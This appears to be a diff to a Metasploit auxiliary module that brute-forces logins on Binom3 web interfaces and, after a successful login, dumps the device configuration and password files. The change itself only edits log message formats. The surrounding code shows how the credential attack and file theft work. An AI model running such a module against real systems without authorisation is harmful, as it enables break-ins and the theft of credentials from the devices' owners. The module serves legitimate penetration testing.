@@ -98,17 +98,17 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
+      print_error("HTTP Connection Failed...")
       return false
     end
 
     if (res && res.code == 200 && res.headers['Server'] && (res.headers['Server'].include?('Team-R Web') || res.body.include?('binom_ico') || res.body.include?('team-r')))
 
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Binom3 confirmed...")
+      print_good("Binom3 confirmed...")
 
       return true
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Application does not appear to be Binom3. Module will not continue.")
+      print_error("Application does not appear to be Binom3. Module will not continue.")
       return false
     end
   end
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_login(user, pass)
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+    print_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
         {
@@ -133,13 +133,13 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
+      vprint_error("HTTP Connection Failed...")
       return :abort
     end
 
     if (res && res.code == 302 && res.get_cookies.include?('IDSESSION'))
 
-      print_good("SUCCESSFUL LOGIN - #{Rex::Socket.to_authority(rhost, rport)} - #{user.inspect}:#{pass.inspect}")
+      print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
 
       report_cred(
         ip: rhost,
@@ -162,10 +162,10 @@ class MetasploitModule < Msf::Auxiliary
 
       if res && res.code == 200
         vprint_status('++++++++++++++++++++++++++++++++++++++')
-        vprint_status("#{rhost} - dumping configuration")
+        vprint_status("dumping configuration")
         vprint_status('++++++++++++++++++++++++++++++++++++++')
 
-        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Configuration file retrieved successfully!")
+        print_good("Configuration file retrieved successfully!")
         path = store_loot(
           'Binom3_config',
           'text/xml',
@@ -174,9 +174,9 @@ class MetasploitModule < Msf::Auxiliary
           rport,
           'Binom3 device config'
         )
-        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Configuration file saved in: #{path}")
+        print_status("Configuration file saved in: #{path}")
       else
-        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve configuration")
+        print_error("Failed to retrieve configuration")
         return
       end
 
@@ -186,10 +186,10 @@ class MetasploitModule < Msf::Auxiliary
 
       if res && res.code == 200
         vprint_status('++++++++++++++++++++++++++++++++++++++')
-        vprint_status("#{rhost} - dumping password file")
+        vprint_status("dumping password file")
         vprint_status('++++++++++++++++++++++++++++++++++++++')
 
-        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Password file retrieved successfully!")
+        print_good("Password file retrieved successfully!")
         path = store_loot(
           'Binom3_passw',
           'text/xml',
@@ -198,12 +198,12 @@ class MetasploitModule < Msf::Auxiliary
           rport,
           'Binom3 device config'
         )
-        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Password file saved in: #{path}")
+        print_status("Password file saved in: #{path}")
       else
         return
       end
     else
-      print_error("FAILED LOGIN - #{Rex::Socket.to_authority(rhost, rport)} - #{user.inspect}:#{pass.inspect}")
+      print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
     end
   end
 end
